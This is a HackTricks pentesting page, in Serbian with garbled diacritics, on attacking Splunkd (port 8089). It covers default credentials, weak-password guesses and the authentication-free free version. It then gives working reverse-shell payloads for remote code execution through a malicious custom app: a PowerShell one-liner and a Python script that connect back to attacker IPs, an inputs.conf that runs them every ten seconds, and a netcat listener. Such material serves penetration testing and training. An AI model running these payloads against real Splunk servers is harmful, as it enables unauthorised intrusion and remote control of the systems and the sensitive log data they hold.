# 8089 - Pentesting Splunkd

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Osnovne informacije**

Splunk je **alat za analizu logova** koji igra kljuÄnu ulogu u **prikupljanju, analiziranju i vizualizaciji podataka**. Iako mu je prvobitna svrha bila da ne sluÅ¾i kao alat za **SIEM (Security Information and Event Management)**, stekao je popularnost u oblasti **monitoringa bezbednosti** i **analitike poslovanja**.

Splunk implementacije se Äesto koriste za skladiÅ¡tenje **osetljivih podataka** i mogu posluÅ¾iti kao **vredan izvor informacija** za potencijalne napadaÄe ako uspeju da kompromituju sistem. **Podrazumevani port:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
**Splunk veb server se podrazumevano pokreÄ‡e na portu 8000**.
{% endhint %}

## Enumeracija

### Besplatna verzija

Splunk Enterprise probna verzija se pretvara u **besplatnu verziju nakon 60 dana**, koja **ne zahteva autentikaciju**. Nije neuobiÄajeno da sistem administratori instaliraju probnu verziju Splunk-a da je isprobaju, koja se **kasnije zaboravi**. Ovo Ä‡e se automatski pretvoriti u besplatnu verziju koja nema nikakav oblik autentikacije, uvodeÄ‡i sigurnosnu rupu u okruÅ¾enje. Neke organizacije mogu odabrati besplatnu verziju zbog ograniÄenja budÅ¾eta, ne shvatajuÄ‡i potpuno posledice nemoguÄ‡nosti upravljanja korisnicima/ulogama.

### Podrazumevane akreditacije

Na starijim verzijama Splunk-a, podrazumevane akreditacije su **`admin:changeme`**, koje su prikladno prikazane na stranici za prijavljivanje.\
MeÄ‘utim, **najnovija verzija Splunk-a** postavlja **akreditacije** **tokom procesa instalacije**. Ako podrazumevane akreditacije ne funkcioniÅ¡u, vredi proveriti uobiÄajene slabe lozinke poput `admin`, `Welcome`, `Welcome1`, `Password123`, itd.

### Dobijanje informacija

Nakon prijavljivanja na Splunk, moÅ¾emo **pregledati podatke**, pokrenuti **izveÅ¡taje**, kreirati **kontrole**, **instalirati aplikacije** iz Splunkbase biblioteke, i instalirati prilagoÄ‘ene aplikacije.\
TakoÄ‘e moÅ¾ete pokrenuti kod: Splunk ima viÅ¡e naÄina za **pokretanje koda**, kao Å¡to su serverske Django aplikacije, REST endpointi, skriptovani ulazi i skripte za upozorenja. ÄŒest naÄin dobijanja izvrÅ¡enja koda na daljinu na Splunk serveru je kroz koriÅ¡Ä‡enje skriptovanog ulaza.

Osim toga, poÅ¡to se Splunk moÅ¾e instalirati na Windows ili Linux hostovima, skriptovani ulazi mogu biti kreirani da pokreÄ‡u Bash, PowerShell ili Batch skripte.

### Shodan

* `Splunk build`

## RCE

### Kreiranje prilagoÄ‘ene aplikacije

PrilagoÄ‘ena aplikacija moÅ¾e pokretati **Python, Batch, Bash ili PowerShell skripte**.\
Imajte na umu da **Splunk dolazi sa instaliranim Python-om**, tako da Äak i na **Windows** sistemima moÅ¾ete pokrenuti python kod.

MoÅ¾ete koristiti [**ovaj**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunk paket da nam pomogne. **`bin`** direktorijum u ovom repozitorijumu ima primere za [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) i [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Hajde da proÄ‘emo kroz ovo korak po korak.

Da bismo postigli ovo, prvo moramo kreirati prilagoÄ‘enu Splunk aplikaciju koristeÄ‡i sledeÄ‡u strukturu direktorijuma:
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
Direktorijum **`bin`** Ä‡e sadrÅ¾ati sve **skripte koje nameravamo da pokrenemo** (u ovom sluÄaju, **PowerShell** reverse shell), a podrazumevani direktorijum Ä‡e imati naÅ¡ `inputs.conf` fajl. NaÅ¡ reverse shell Ä‡e biti **PowerShell jednolinijski:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Fajl [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) govori Splunku **koji skript da pokrene** i o biloj drugim uslovima. Ovde postavljamo aplikaciju kao omoguÄ‡enu i govorimo Splunku da pokrene skript svakih 10 sekundi. Interval je uvek u sekundama, a ulaz (skripta) Ä‡e se pokrenuti samo ako je ova postavka prisutna.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Potreban nam je `.bat` fajl, koji Ä‡e se pokrenuti kada se aplikacija implementira i izvrÅ¡iti PowerShell jednolinijski nalog.

SledeÄ‡i korak je odabrati `Instaliraj aplikaciju iz fajla` i otpremiti aplikaciju.

<figure><img src="../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

Pre otpremanja zlonamerne prilagoÄ‘ene aplikacije, pokrenimo sluÅ¡aoca koristeÄ‡i Netcat ili [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Na stranici `Upload app`, kliknite na `browse`, izaberite tarball koji smo ranije kreirali i kliknite na `Upload`. ÄŒim **uploadujemo aplikaciju**, **dobijamo reverse shell** jer Ä‡e se status aplikacije automatski promeniti na `Enabled`.

#### Linux

Ako bismo imali posla sa **Linux hostom**, morali bismo **urediti Python skriptu `rev.py`** pre kreiranja tarball-a i uploadovanja prilagoÄ‘ene zlonamerne aplikacije. Ostatak procesa bi bio isti, i dobili bismo reverse shell konekciju na naÅ¡ Netcat listener i bili spremni za akciju.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Eskalacija privilegija

Na sledeÄ‡oj stranici moÅ¾ete pronaÄ‡i objaÅ¡njenje kako se ovaj servis moÅ¾e zloupotrebiti radi eskalacije privilegija i postizanja postojanosti:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Reference

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
